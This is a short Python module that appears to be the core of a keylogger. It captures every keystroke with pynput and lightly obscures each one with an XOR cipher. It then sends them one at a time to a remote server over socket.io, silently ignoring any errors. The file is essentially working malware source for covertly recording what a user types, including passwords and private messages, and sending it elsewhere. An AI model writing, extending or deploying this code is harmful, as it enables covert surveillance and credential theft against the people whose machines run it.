from __future__ import annotations

from pynput.keyboard import Key, KeyCode
from socketio import Client

from shared.Encriptor import XorCharCipher

translate_key = {
    'space': ' ',
    'enter': '\n',
    'tab': '\t',
}

cipher = XorCharCipher(77)

def on_key(key:  (Key | KeyCode | None) , sio: Client):
    """Handle key press event from pynput and send to server via socket.io."""
    try:
        if hasattr(key, 'char') and key.char is not None:
            # Regular character key
            key_value = key.char
        else:
            # Special key (Key.space, Key.enter, etc.)
            key_name = str(key).replace('Key.', '').lower()
            key_value = translate_key.get(key_name, key_name)

        key_value = cipher.encrypt_char(key_value)
        sio.emit('ev', {'ev': key_value})
    except Exception as e:
        pass
